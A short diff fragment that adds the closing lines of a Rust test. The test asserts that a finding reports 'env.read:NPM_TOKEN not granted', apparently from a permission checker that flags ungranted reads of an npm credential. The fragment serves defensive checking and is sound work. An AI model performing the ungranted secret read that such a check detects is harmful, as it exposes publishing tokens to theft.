+            .iter()
+            .any(|finding| finding.message.contains("env.read:NPM_TOKEN not granted")));
+    }
+}
